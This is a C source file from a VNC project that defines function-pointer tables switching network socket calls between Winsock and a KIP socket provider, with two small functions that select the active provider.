//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: tsocket.c
// $Revision: 137 $
// $Date: 2013-07-23 16:57:05 +0400 (Вт, 23 июл 2013) $
// description:
//  Socket provider abstraction layer.
//	Defines multiple tables containing pointers to functions of different socket providers.
//	Socket provider can be easily changed by replacing it's function table pointer within g_CurrentTsocketTable variable.
//	Defines socket table managemet functions.

#include "main.h"
#include "tsocket.h"

#ifdef _KIP_SUPPORT

// Socket function pointers for winsock
static TSOCKET_TABLE	g_WinsockTable = 
{
	(FUNC_SOCKET)			&socket,
	(FUNC_CLOSE)			&closesocket,
	(FUNC_IOCTL)			&ioctlsocket,
	(FUNC_SENDTO)			&sendto,
	(FUNC_RECVFROM)			&recvfrom,
	(FUNC_GETSOCKOPT)		&getsockopt,
	(FUNC_SELECT)			&select,
	(FUNC_CONNECT)			&connect,
	(FUNC_SETSOCKOPT)		&setsockopt,
	(FUNC_BIND)				&bind,
	(FUNC_SHUTDOWN)			&shutdown,
	(FUNC_SEND)				&send,
	(FUNC_GETSOCKNAME)		&getsockname,
	(FUNC_RECV)				&recv,
	(FUNC_GETPEERNAME)		&getpeername,
	(FUNC_GETHOSTBYNAME)	&gethostbyname,
	(FUNC_GETHOSTBYNAMER)	NULL,
	(FUNC_LISTEN)			&listen,
	(FUNC_ACCEPT)			&accept,
};

// Socket function pointers for KIP
static TSOCKET_TABLE	g_KSockTable = 
{
	(FUNC_SOCKET)			_tsocket,
	(FUNC_CLOSE)			_tclosesocket,
	(FUNC_IOCTL)			_tioctlsocket,
	(FUNC_SENDTO)			_tsendto,
	(FUNC_RECVFROM)			_trecvfrom,
	(FUNC_GETSOCKOPT)		_tgetsockopt,
	(FUNC_SELECT)			_tselect,
	(FUNC_CONNECT)			_tconnect,
	(FUNC_SETSOCKOPT)		_tsetsockopt,
	(FUNC_BIND)				_tbind,
	(FUNC_SHUTDOWN)			_tshutdown,
	(FUNC_SEND)				_tsend,
	(FUNC_GETSOCKNAME)		_tgetsockname,
	(FUNC_RECV)				_trecv,
	(FUNC_GETPEERNAME)		_tgetpeername,
	(FUNC_GETHOSTBYNAME)	_tgethostbyname,
	(FUNC_GETHOSTBYNAMER)	NULL,
	(FUNC_LISTEN)			_tlisten,
	(FUNC_ACCEPT)			_taccept,
};

// Pointer to a function table of the current socket provider
PTSOCKET_TABLE	volatile g_CurrentTsocketTable	 = &g_KSockTable;

// Socket table management functions
VOID TsocketUseKip(VOID)
{
	g_CurrentTsocketTable = &g_KSockTable;
	DbgPrint("VNC: TSocket interface switched to KIP.\n");
}

VOID TsocketUseWinsock(VOID)
{
	g_CurrentTsocketTable = &g_WinsockTable;
	DbgPrint("VNC: TSocket interface switched to Winsock.\n");
}

#endif // _KIP_SUPPORT